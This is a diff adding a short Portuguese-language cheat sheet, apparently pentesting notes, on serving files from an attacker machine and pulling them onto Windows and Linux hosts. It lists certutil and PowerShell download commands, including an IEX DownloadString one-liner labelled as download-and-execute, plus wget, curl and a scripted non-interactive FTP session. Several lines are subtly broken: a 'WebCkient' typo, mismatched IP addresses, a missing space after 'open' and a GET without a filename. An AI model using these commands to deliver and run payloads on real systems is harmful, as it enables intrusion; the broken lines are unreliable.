@@ -1,0 +1,63 @@
+# =============================================
+# Atraves da internet
+# =============================================
+
+# Disponibilizando os arquivos
+# ------------------------------
+
+Usando apache:
+
+    systemctl start apache2 (/var/www/html/file.exe)
+
+Usando python2:
+
+    python -m SimpleHTTPServer 80
+
+Usando python3:
+
+    python3 -m http.server 80
+
+# Download dos arquivos.
+# -----------------------------
+
+No WINDOWS:
+
+    1) certutil.exe -urlcache -f http://192.168.1.1/file.exe file.exe
+    2) powershell.exe wget http://192.168.1.1/file.exe -OutFile file.exe
+    3) powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.169.1.1/file.exe','file.exe')
+    3) powershell.exe IEX(New-Object System.Net.WebCkient).DownloadString('http://172.168.1.1/file.txt') -> baixa e executa.
+
+No LINUX:
+
+    1) wget http://192.168.1.1/file.exe -O /tmp/file.exe
+    2) curl http://192.168.1.1/file.exe -o file.exe
+
+# =============================================
+# Através do FTP
+# =============================================
+
+# Disponibilizando os arquivos
+# -------------------------------
+
+Usando python:
+
+    pip install pyftpdlib
+    python -m pyftpdlib -p 21 --write
+
+# Download dos arquivos
+# -------------------------------
+
+No WINDOWS:
+
+Em uma shell não interativa:
+
+    1) Criar um arquivo com o conteudo:
+
+        echo open192.168.1.1 > ftp.txt
+        echo USER anonymous >> ftp.txt
+        echo PASS anonymous >> ftp.txt
+        echo bin >> ftp.txt
+        echo GET >> ftp.txt
+        echo QUIT >> ftp.txt
+
+    2) ftp -v -n -s:ftp.txt
